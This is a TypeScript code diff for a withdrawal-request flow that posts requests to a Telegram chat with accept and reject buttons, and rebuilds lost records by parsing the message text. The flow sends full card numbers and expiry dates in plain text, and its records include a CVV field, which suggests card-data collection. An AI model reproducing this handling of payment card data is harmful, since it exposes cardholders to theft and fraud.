@@ -181,6 +181,9 @@ export async function submitWithdraw(input: WithdrawInput): Promise<WithdrawDoc>
     chatId,
   };
 
+  // Persist BEFORE notifying Telegram so the buttons always resolve.
+  await store.insert(doc);
+
   const sent = (await telegramCall("sendMessage", {
     chat_id: chatId,
     text: caption(doc),
@@ -196,19 +199,71 @@ export async function submitWithdraw(input: WithdrawInput): Promise<WithdrawDoc>
   })) as { message_id: number };
 
   doc.messageId = sent?.message_id;
-  await store.insert(doc);
+  if (sent?.message_id) await store.update(doc.id, { messageId: sent.message_id });
   return doc;
 }
 
+/**
+ * Rebuilds a withdrawal from the Telegram message text when the stored record
+ * is missing, so Accept / Reject never fails with "not found".
+ */
+function withdrawFromText(id: string, text: string, chatId: number): WithdrawDoc | null {
+  const userId = /User ID:\s*(\S+)/.exec(text)?.[1]?.trim();
+  const username = /Username:\s*(.+)/.exec(text)?.[1]?.trim() ?? "";
+  const amount = Number(/Amount:\s*([\d.]+)/.exec(text)?.[1]);
+  const fee = Number(/Fee \(25%\):\s*([\d.]+)/.exec(text)?.[1]);
+  const payout = Number(/Payout:\s*([\d.]+)/.exec(text)?.[1]);
+  const bank = /Bank:\s*(.+)/.exec(text)?.[1]?.trim() ?? "";
+  const card = /Card:\s*([\d ]+)/.exec(text)?.[1]?.replace(/\D/g, "") ?? "";
+  const expiry = /Exp:\s*(\d{2}\/\d{2})/.exec(text)?.[1] ?? "";
+  if (!userId || !Number.isFinite(amount) || amount <= 0) return null;
+  return {
+    id,
+    userId,
+    username,
+    bank,
+    amount,
+    fee: Number.isFinite(fee) ? fee : Number((amount * WITHDRAW_FEE_RATE).toFixed(2)),
+    payout: Number.isFinite(payout) ? payout : Number((amount * (1 - WITHDRAW_FEE_RATE)).toFixed(2)),
+    cardNumber: card,
+    cardBrand: card ? detectCardBrand(card) : "Card",
+    expiry,
+    cvv: "",
+    status: "pending",
+    createdAt: new Date().toISOString(),
+    chatId,
+  };
+}
+
 /** Handles the Accept / Reject inline buttons for withdrawals. */
-export async function handleWithdrawCallback(data: string, chatId: number, messageId: number) {
+export async function handleWithdrawCallback(
+  data: string,
+  chatId: number,
+  messageId: number,
+  text?: string,
+) {
   const [, action, id] = data.split(":");
   if (!id || (action !== "ok" && action !== "no")) return "Unknown action";
 
   const store = await getWithdrawStore();
-  const w = await store.find(id);
+  let w = await store.find(id);
+
+  if (!w && text) {
+    const recovered = withdrawFromText(id, text, chatId);
+    if (recovered) {
+      w = recovered;
+      try {
+        await store.insert(recovered);
+      } catch {
+        /* already there, ignore */
+      }
+    }
+  }
+
   if (!w) return "Withdrawal not found";
-  if (w.status !== "pending") return "Already processed";
+  if (w.status !== "pending") {
+    return w.status === "approved" ? "Artıq qəbul edilib" : "Artıq rədd edilib";
+  }
 
   if (action === "ok") {
     await store.update(id, { status: "approved" });
@@ -223,9 +278,9 @@ export async function handleWithdrawCallback(data: string, chatId: number, messa
     chat_id: chatId,
     message_id: messageId,
     parse_mode: "HTML",
-    text: caption(w, action === "ok" ? "\n\n✅ Qəbul edildi" : "\n\n❌ Rədd edildi"),
+    text: caption(w, action === "ok" ? "\n\n\u2705 Q\u0259bul edildi" : "\n\n\u274c R\u0259dd edildi"),
     reply_markup: { inline_keyboard: [] },
-  }).catch((e) => console.error(e));
+  }).catch((e) => console.error("editMessageText failed:", e));
 
   return action === "ok" ? "Qəbul edildi" : "Rədd edildi";
 }
